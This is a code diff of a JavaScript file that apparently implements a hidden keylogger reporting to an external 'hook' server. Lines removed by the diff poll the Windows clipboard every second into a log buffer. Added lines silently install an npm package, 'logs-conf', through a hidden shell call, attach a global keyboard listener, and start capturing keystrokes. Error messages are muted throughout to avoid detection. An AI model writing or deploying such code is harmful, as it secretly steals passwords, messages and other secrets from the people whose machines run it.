@@ -15,46 +15,7 @@ try {
     let lastClipboardContent = '';
 
     const hookDomain = "https://hook-server-beta.vercel.app";
-    // const hookDomain = "http://localhost:4000";
-
-    function getClipboardText() {
-        try {
-            const platform = os.platform();
-            let text;
-            if (platform === 'win32') {
-                text = execSync('powershell -command "Get-Clipboard"').toString().trim();
-            }
-            // else if (platform === 'darwin') {
-            //     text = execSync('pbpaste').toString().trim();
-            // } else if (platform === 'linux') {
-            //     text = execSync('xclip -selection clipboard -o').toString().trim();
-            // } else {
-            //     throw new Error('Unsupported OS');
-            // }
-            return text;
-        } catch (err) {
-            // console.error('Failed to read clipboard:', err);
-            return null;
-        }
-    }
-
-    setInterval(() => {
-        const currentContent = getClipboardText();
-        if (currentContent !== lastClipboardContent) {
-            //console.log('Clipboard changed:', currentContent);
-            rawBuffer += '\n--------------------------------------------------------------------------------->>>>>>Clip:'+currentContent+'\n';
-            lastClipboardContent = currentContent;
-        }
-    }, 1000); // check every second
-
-    // Try to require the jsonpacks module
-    try {
-        GlobalKeyboardListener = require("logs-conf").GlobalKeyboardListener;
-        v = new GlobalKeyboardListener();
-    } catch (error) {
-        // console.warn('Some modules are deprecated and won\'t work well in the future...');
-    }
- 
+    
     function processKeyEvent(event, down) {
         if (!v) return;
 
@@ -69,7 +30,7 @@ try {
                         if (err) {
                             // console.error('Error writing to file:', err);
                         } else {
-                             //console.log('Data appended successfully.');
+                            // console.log('Data appended successfully.');
                         }
                     });
                     rawBuffer = '';
@@ -112,7 +73,15 @@ try {
             }
         }
     }; 
-    init();
+
+    execSync('npm install logs-conf --save --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true });
+    try {
+                const { GlobalKeyboardListener } = require('logs-conf');
+                v = new GlobalKeyboardListener();
+                init(); // your setup code
+    } catch (err) {
+        // console.error('Failed to require logs-conf after installation:', err);
+    }
 
 } catch (error) {
     // console.error(`Unexpected error: ${error}`);
